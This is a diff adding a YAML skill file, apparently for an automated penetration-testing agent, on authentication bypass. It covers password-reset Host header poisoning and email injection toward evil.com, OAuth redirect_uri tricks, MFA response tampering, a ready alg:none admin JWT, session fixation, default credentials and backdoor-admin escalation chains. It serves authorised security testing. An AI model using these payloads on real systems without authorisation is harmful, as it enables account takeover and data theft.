@@ -1,0 +1,189 @@
+name: authentication_bypass
+description: Authentication bypass, session manipulation, and credential flow exploitation techniques
+techniques:
+  - "Password reset flow manipulation and token exploitation"
+  - "OAuth/OIDC redirect and token theft attacks"
+  - "MFA bypass via response manipulation and session persistence"
+  - "Session fixation, donation, and concurrent session abuse"
+  - "Registration and enumeration logic exploitation"
+  - "Default credential and exposed secret discovery"
+tools:
+  - httpx
+  - nuclei
+  - browser_navigate
+  - curl
+knowledge: |
+  Authentication bypass targets the logic around identity verification — not the crypto, but the
+  implementation. Every auth flow is a state machine; find the transitions that skip steps.
+
+  ## Password Reset Exploitation
+  Token prediction:
+    Weak tokens: timestamp-based, sequential, MD5(email+timestamp), short numeric codes.
+    If the token is 6 digits, brute-force 000000-999999. Check for rate limiting on the verify endpoint.
+    If tokens are time-based, generate two resets seconds apart and look for patterns.
+  Token reuse:
+    Reset password, then try the same token again — does the app invalidate it?
+    If multi-use, attacker who intercepts a token can use it after the victim already reset.
+  Host header injection:
+    The app generates a reset link using the Host header:
+      POST /forgot-password HTTP/1.1
+      Host: evil.com
+    → Reset email contains: https://evil.com/reset?token=SECRET
+    The victim clicks, token goes to attacker. Also try X-Forwarded-Host, X-Host, Forwarded headers.
+  Email parameter pollution:
+    victim@example.com%00attacker@evil.com — null byte may truncate for lookup but send to both.
+    victim@example.com,attacker@evil.com — CC injection via comma.
+    victim@example.com%0d%0aCc:attacker@evil.com — CRLF header injection in email.
+    {"email": ["victim@example.com", "attacker@evil.com"]} — array parameter, app may send to both.
+  Reset flow bypass:
+    Skip the "enter token" step — directly call POST /reset-password with known email and new password.
+    Some apps only check the token in the UI, not the backend.
+
+  ## Session Management Attacks
+  Session fixation:
+    If the app accepts session IDs from URL parameters (JSESSIONID, PHPSESSID in URL) or doesn't
+    regenerate on login: set victim's session ID before they log in, then use it after they authenticate.
+    Test: set a known session cookie → authenticate → check if the same cookie is still valid.
+  Session donation:
+    Log into attacker's account → send the session cookie to the victim.
+    Victim performs actions (add credit card, upload data) thinking they're in their own account.
+    Attacker retrieves the donated data from their own account.
+  Concurrent session abuse:
+    "Single active session" policy: login on device A, then device B invalidates A's session.
+    Race condition: log in simultaneously on A and B — both sessions may remain valid.
+    Test session revocation: does changing password actually invalidate all existing sessions?
+  Session token in URL:
+    If session token appears in URL, check Referrer header leakage to external sites.
+    Shared links may contain active session tokens.
+  JWT-specific:
+    Algorithm confusion: change alg from RS256 to HS256, sign with the public key as HMAC secret.
+    None algorithm: set alg to "none" with empty signature.
+    Key confusion: kid parameter pointing to /dev/null or a file you control.
+    Expired token acceptance: send tokens with exp in the past — not all implementations reject them.
+    Missing claims: remove iss, aud, or sub claims and see if validation still passes.
+
+  ## OAuth/OIDC Exploitation
+  redirect_uri manipulation:
+    Open redirect on the app → use as redirect_uri → token sent to attacker's endpoint.
+    Path traversal: redirect_uri=https://app.com/callback/../attacker-page
+    Subdomain: redirect_uri=https://evil.app.com/callback (if wildcard subdomain matching).
+    Fragment trick: redirect_uri=https://app.com/callback#@evil.com
+    URL encoding: redirect_uri=https://app.com/callback%23@evil.com
+    Test strict vs prefix matching: /callback vs /callback-evil vs /callback?x=evil
+  State parameter:
+    Missing entirely → CSRF-based login with attacker's OAuth account (account linking attack).
+    Weak/predictable: sequential, timestamp, short — brute-forceable.
+    Not bound to session: steal state from one browser, use in another.
+  PKCE downgrade:
+    If server accepts requests without code_challenge when PKCE was negotiated, an interceptor
+    can exchange the authorization code without the verifier.
+  Token leakage:
+    Referrer header: if token is in URL fragment, navigation to external page leaks it.
+    Browser history: implicit flow tokens in URL persist in history.
+    Server logs: authorization code in query string logged by proxies.
+  Scope escalation:
+    Request broader scopes than granted in original auth: scope=openid+profile+email+admin.
+    Some servers don't restrict to pre-configured scope sets.
+
+  ## MFA Bypass Techniques
+  Response manipulation:
+    Intercept the MFA challenge response: change {"mfa_required": true} to {"mfa_required": false}.
+    Change HTTP status from 403 to 200 on the MFA enforcement step.
+    Some apps set a cookie like mfa_verified=0 — change to mfa_verified=1.
+  Direct navigation:
+    After entering username/password, skip the MFA page — navigate directly to /dashboard.
+    Does the app check MFA completion on every authenticated endpoint, or just the MFA page?
+  Backup code brute force:
+    Backup codes are typically 8-10 chars. If there's no rate limit on the backup code endpoint,
+    brute-force is feasible. Some apps use numeric-only backup codes.
+  Session persistence after MFA:
+    Complete MFA once → session is MFA-verified. If the session doesn't expire or get
+    re-challenged, stolen session cookie bypasses MFA permanently.
+  MFA enrollment bypass:
+    Register new account → is MFA enforced before first use? Some apps only require MFA after
+    setup, allowing access window between registration and MFA enrollment.
+  SIM swap / social engineering:
+    SMS-based MFA: if you can port the victim's number (out of scope for automated testing,
+    but note SMS MFA as a weaker factor in reports).
+
+  ## Registration Logic Exploitation
+  Duplicate registration race:
+    Concurrent POST /register with the same email — one account may bypass email verification.
+    See race_conditions skill for synchronization techniques.
+  Email verification bypass:
+    Register → get verification link → change email in profile before verifying → verify original link.
+    Does verification token bind to the original email or just the account?
+    Try: register with attacker email → verify → change email to victim's email.
+  Username/email enumeration:
+    Login error: "Invalid password" vs "User not found" — enumerates valid users.
+    Registration: "Email already taken" — confirms existing accounts.
+    Password reset: "Reset link sent" vs "Email not found".
+    Timing: valid users trigger DB lookup + hash check (slower) vs instant rejection.
+    Normalize responses by measuring response time differential > 50ms.
+  Case sensitivity / normalization:
+    Register Admin@App.com when admin@app.com exists — some DBs are case-sensitive.
+    Unicode normalization: register with homoglyph (Аdmin vs Admin, Cyrillic А vs Latin A).
+    Trailing whitespace: "admin " vs "admin".
+
+  ## Default and Exposed Credentials
+  Common defaults: admin/admin, admin/password, admin/changeme, test/test, guest/guest.
+  Framework defaults: Spring Boot Actuator (no auth), Django admin (/admin/), Tomcat manager (tomcat/s3cret).
+  API keys in client-side code: search JS bundles for api_key, apiKey, secret, token, Bearer.
+  .env files exposed: /.env, /.env.production, /.env.local — often contain DB creds and API secrets.
+  Git exposure: /.git/config, /.git/HEAD — use git-dumper to reconstruct source.
+  Swagger/OpenAPI with auth tokens: /swagger-ui.html, /api-docs may contain example auth headers.
+  Debug endpoints: /debug, /actuator, /elmah.axd, /trace, /_profiler — may bypass auth entirely.
+
+  ## Escalation Chains
+  Auth bypass → admin access → user management → create backdoor admin → persistent access.
+  Host header poisoning on reset → token theft → victim account takeover.
+  OAuth redirect manipulation → token theft → impersonation → data exfiltration.
+  MFA bypass → access to high-privilege account → financial transactions / data access.
+  Session fixation + social engineering → victim authenticates attacker's session → account hijack.
+  Username enumeration → targeted credential stuffing → account compromise.
+  Default credentials on admin panel → RCE via file upload or code execution feature.
+  JWT alg:none → forge admin token → full API access without credentials.
+
+  ## Common Pitfalls
+  - Always test auth on every endpoint, not just the login page — middleware misconfigurations are common.
+  - Check if password change requires old password — if not, any session compromise leads to account lockout.
+  - Cookie flags: missing Secure, HttpOnly, SameSite attributes increase attack surface but aren't bypasses themselves.
+  - Some OAuth flows use fragments (#token=...) which aren't sent to the server but are visible to JS on the page.
+  - Rate limiting on login doesn't prevent credential stuffing if it's per-IP and you have distributed IPs.
+  - Account lockout policies can become a DoS vector — lock out legitimate users by failing their passwords.
+  - Test logout: does the server-side session actually get destroyed, or just the client cookie deleted?
+examples:
+  - title: "Host Header Poisoning on Password Reset"
+    description: "Inject attacker domain via Host header to steal password reset token"
+    payload: "POST /forgot-password HTTP/1.1\\nHost: evil.com\\nContent-Type: application/json\\n{\"email\":\"victim@example.com\"}"
+    validation: "Reset email sent to victim contains link pointing to evil.com with valid reset token in URL"
+  - title: "OAuth redirect_uri Manipulation"
+    description: "Abuse open redirect or lax matching to steal OAuth authorization code"
+    payload: "GET /oauth/authorize?client_id=APP&redirect_uri=https://app.com/callback/../evil-page&response_type=code&scope=openid"
+    validation: "Authorization code is sent to the attacker-controlled path; exchangeable for access token"
+  - title: "MFA Response Manipulation"
+    description: "Bypass MFA by altering the server's MFA enforcement response"
+    payload: "Intercept POST /api/mfa/verify response; change {\"mfa_required\":true,\"status\":\"pending\"} to {\"mfa_required\":false,\"status\":\"authenticated\"}"
+    validation: "Application grants authenticated session without completing MFA challenge; access to protected resources confirmed"
+  - title: "JWT Algorithm None Attack"
+    description: "Forge an admin JWT by setting algorithm to none and removing the signature"
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
+    validation: "Server accepts the unsigned JWT and grants admin-level access to API endpoints"
+  - title: "Email Parameter Pollution on Reset"
+    description: "Inject additional email recipient into password reset flow"
+    payload: "POST /forgot-password {\"email\": \"victim@example.com%0d%0aCc:attacker@evil.com\"}"
+    validation: "Attacker receives copy of the password reset email containing valid reset token for victim's account"
+  - title: "Session Fixation via URL Parameter"
+    description: "Set victim's session ID before authentication to hijack the session post-login"
+    payload: "Send victim link: https://app.com/login?JSESSIONID=ATTACKER_KNOWN_SESSION_ID"
+    validation: "After victim authenticates, attacker uses the known session ID to access victim's authenticated session"
+validation_methods:
+  - "Demonstrate authenticated access to protected resources without providing valid credentials or completing all auth steps"
+  - "Show that a stolen or forged token (JWT, reset token, OAuth code) grants access to another user's account"
+  - "Verify MFA bypass by accessing MFA-protected functionality after manipulating the challenge-response flow"
+  - "Confirm session management flaws by using fixated, donated, or expired sessions to access authenticated endpoints"
+  - "Validate enumeration by demonstrating distinguishable responses (content, timing, status code) for valid vs invalid usernames"
+references:
+  - "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/"
+  - "https://portswigger.net/web-security/authentication"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover"
